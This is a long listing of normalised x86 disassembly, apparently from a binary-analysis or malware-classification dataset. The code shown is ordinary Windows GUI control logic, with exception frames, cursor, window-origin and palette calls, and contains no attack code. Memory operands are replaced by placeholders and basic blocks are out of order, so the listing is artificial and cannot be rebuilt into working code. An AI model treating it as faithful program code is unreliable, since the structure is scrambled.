jne r-xdata
xor edx edx
push ebp
push sub_4321c4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_432152
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_430dc4
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032a0
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_431e84
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_4317b0
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_43bc44
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432159
mov eax [ rw-data ]
call sub_4030f0
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_44a5dc
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_434b3c
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_43167c
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_44e248
sub_432159
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40327c
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_4030f0
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_40327c
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
sub_4321e8
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_430850
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43221c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_4321e8
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_4334b4
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_437a5c
test eax eax
je r-xdata
mov esi eax
sub_432264
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_413704
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebx ] eax
sub_43228c
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_4139fc
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_4030f0
xor eax eax
mov [ ebx ] eax
sub_4322ac
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4322dc
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_413c24
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43238c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413c88
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_432365
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_432518
call sub_403910
call sub_403910
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413860
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_41d978
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_432398
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_413c24
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_432436
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43243d
mov eax [ rw-data ]
call sub_413c88
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_43240e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_432518
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41d9d4
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413860
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41d978
test al al
je r-xdata
sub_432444
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax esi
call sub_432518
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d538
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_432470
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41db58
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_41db5c
mov eax [ ebp - 0x4 ]
call sub_432564
mov eax [ rw-data ]
call sub_413c24
mov ebx eax
xor eax eax
push ebp
push sub_4324f5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_413704
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413c88
retn
call sub_4322dc
sub_432518
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_41db5c
mov edx ebx
mov eax [ rw-data ]
call sub_413c38
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_432564
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_433fcc
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_432590
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030c0
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_4325cc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_413f40
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_432614
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_4326d0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43279d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4327a4
lea eax [ ebp - 0x1c ]
call sub_403eac
lea eax [ ebp - 0x8 ]
call sub_403eac
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_4032ec
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_442d10
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408940
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_403f00
sub_4327c0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_432827
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_43fddc
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_433970
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a0
mov edx [ eax + 0x64 ]
pop eax
call sub_4042b8
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43282e
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
mov al 0x1
sub_432834
push ebx
mov ebx eax
mov eax ebx
call sub_43fe04
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a0
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_432868
push ebx
mov ebx eax
mov eax ebx
call sub_43fe54
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a0
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_4042b8
je r-xdata
mov al 0x1
pop ebx
retn
sub_4328a0
push ebx
mov ebx eax
mov eax ebx
call sub_43fe90
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a0
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4328d4
push ebx
mov ebx eax
mov eax ebx
call sub_41a3fc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4328fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4339a0
sub_43291c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_43293c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_403f00
sub_432960
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_433890
sub_432980
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_4329ac
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a0
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a0
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_4042b8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a0
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_432a10
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4332ec
sub_432a30
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4332d8
sub_432a50
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_432a70
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419b0c
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c984
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_433a20
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_432590
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_4348fc
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_432b48
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_403464
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_452160
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40344c
push edi
xor ecx ecx
mov edx 0xb039
call sub_434b3c
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_433310
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_4032ec
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_4030f0
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_4030f0
mov eax [ edi + 0x68 ]
call sub_4030f0
mov eax [ edi + 0x64 ]
call sub_4084b0
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419b58
test bl bl
jle r-xdata
sub_432c14
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_432c3c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_4032ec
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_432cc4
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_432fc4
sub_432ce4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_4030f0
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_435958
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_4032ec
mov edx ebx
mov eax edi
call sub_419bdc
mov eax ebx
mov si 0xffd9
call sub_4032ec
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_432dac
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_419f6c
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_434b3c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_434b3c
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_434b3c
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_434b3c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_434b3c
sub_432e40
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419e28
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_433928
jmp r-xdata
xor edx edx
mov eax esi
call sub_432ce4
sub_432e84
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_4032ec
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_432cc4
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_4032ec
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_432f2c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_4350cc
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_433db8
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_432fc4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_434b3c
mov eax ebx
mov si 0xffd0
call sub_4032ec
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_4032ec
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_432fc4
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_43a474
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
